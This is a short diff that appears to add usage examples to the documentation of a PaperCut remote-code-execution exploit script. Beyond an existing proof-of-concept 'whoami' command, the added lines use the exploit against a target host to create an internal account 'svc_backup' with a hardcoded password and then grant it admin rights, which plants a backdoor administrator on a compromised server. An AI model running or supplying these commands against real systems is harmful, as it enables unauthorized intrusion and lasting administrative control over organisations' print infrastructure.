@@ -15,6 +15,14 @@ python3 papercut_external_lookup_rce.py 192.168.1.10 --check -v
 python3 papercut_external_lookup_rce.py papercut.corp.local --ssl \
   --win-command 'whoami > C:\proof.txt'
 
+# Create the internal user
+python3 papercut_external_lookup_rce.py 10.0.0.5 \
+  --win-command 'cmd /c ""C:\Program Files\PaperCut MF\server\bin\win\server-command.exe" add-new-internal-user svc_backup S3cretPass"'
+
+# Grant admin rights
+python3 papercut_external_lookup_rce.py 10.0.0.5 \
+  --win-command 'cmd /c ""C:\Program Files\PaperCut MF\server\bin\win\server-command.exe" add-admin-access-user svc_backup"'
+
 
 # pcut2025
 
